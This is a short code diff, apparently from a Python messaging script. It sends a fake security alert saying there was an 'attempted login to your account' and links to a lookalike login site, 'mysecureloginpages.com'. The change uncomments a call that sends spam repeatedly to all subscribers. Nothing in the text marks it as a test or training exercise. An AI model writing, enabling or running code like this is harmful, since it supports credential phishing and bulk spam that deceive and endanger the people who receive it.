@@ -87,6 +87,6 @@ repeat = 4
 send_message('There was an attempted login to your account. If this was not you, please click the following link to login and view the most recent login attempt: https://mysecureloginpages.com')
 
 # Send spam message to all subscribers/ or one subscriber
-#send_spam(message, repeat=repeat)
+send_spam(message, repeat=repeat)
 
 
